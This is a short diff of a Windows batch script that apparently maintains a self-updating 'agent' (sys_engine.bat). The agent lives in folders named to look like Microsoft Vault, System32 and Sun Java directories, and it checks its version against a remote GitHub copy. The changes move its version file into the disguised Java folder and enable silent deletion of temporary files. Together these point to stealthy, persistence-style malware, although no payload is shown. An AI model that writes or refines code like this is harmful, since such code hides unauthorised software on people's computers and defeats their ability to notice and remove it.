@@ -8,7 +8,8 @@ set "AGENTE_DIR=%AppData%\Microsoft\Vault"
 set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"   
 set "BACKUP_DIR=%windir%\System32\drivers\etc\vps_logs"
 set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment"
-set "VLINEA=%temp%\v_data.txt"
+::set "VLINEA=%temp%\v_data.txt"
+set "VLINEA=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment\lv_data.txt"
 set "MEM_DIR=%VERSION_DIR%"
 
 :: URLs de GitHub
@@ -35,11 +36,11 @@ if exist "%VERSION_LOCAL%" (
     set "LINEA_LOCAL=0"
 ) 
 if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
-::    del "%VLINEA%"
+    del "%VLINEA%" >nul 2>&1
     exit
 ) else (
     copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
-::    del "%VLINEA%" 
+    del "%VLINEA%" >nul 2>&1
 )
 ::
 ::
